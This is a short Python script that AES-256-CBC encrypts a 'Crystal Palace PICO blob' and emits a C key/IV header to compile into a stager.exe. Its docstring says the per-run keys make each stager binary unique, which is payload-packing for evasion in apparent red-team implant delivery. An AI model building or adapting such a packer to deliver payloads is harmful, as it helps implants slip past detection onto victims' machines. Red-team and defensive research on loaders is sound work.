#!/usr/bin/env python3
"""
gen_payload.py — AES-256-CBC encrypt a Crystal Palace PICO blob.

Outputs:
  <payload.dat>  AES-256-CBC ciphertext — deliver alongside stager.exe
  <key.h>        C header with key/iv arrays — compiled into stager.exe

Fresh random key + IV every run so each stager binary is unique.

Usage:
  python3 gen_payload.py <input.bin> <payload.dat> <key.h>

Requires: openssl(1) in PATH (standard on Kali/Debian).
"""
import os, sys, subprocess

if len(sys.argv) != 4:
    print(f"Usage: {sys.argv[0]} <input.bin> <payload.dat> <key.h>",
          file=sys.stderr)
    sys.exit(1)

infile, datfile, keyfile = sys.argv[1:]

key = os.urandom(32)   # AES-256 key
iv  = os.urandom(16)   # CBC IV

subprocess.run([
    'openssl', 'enc', '-aes-256-cbc', '-nosalt',
    '-K', key.hex(), '-iv', iv.hex(),
    '-in', infile, '-out', datfile,
], check=True)

def c_bytes(name, data):
    lines = [f'static const unsigned char {name}[] = {{']
    for i in range(0, len(data), 16):
        chunk = data[i:i+16]
        lines.append('    ' + ','.join(f'0x{b:02x}' for b in chunk) + ',')
    lines.append('};')
    return '\n'.join(lines)

with open(keyfile, 'w') as f:
    f.write('/* auto-generated — do not edit */\n\n')
    f.write(c_bytes('payload_key', key))
    f.write(f'\nstatic const unsigned int payload_key_len = {len(key)};\n\n')
    f.write(c_bytes('payload_iv', iv))
    f.write(f'\nstatic const unsigned int payload_iv_len = {len(iv)};\n')

enc_size = os.path.getsize(datfile)
print(f'[+] {datfile}: {enc_size} bytes  (AES-256-CBC, no salt)',
      file=sys.stderr)
print(f'[+] {keyfile}: key_len=32  iv_len=16', file=sys.stderr)
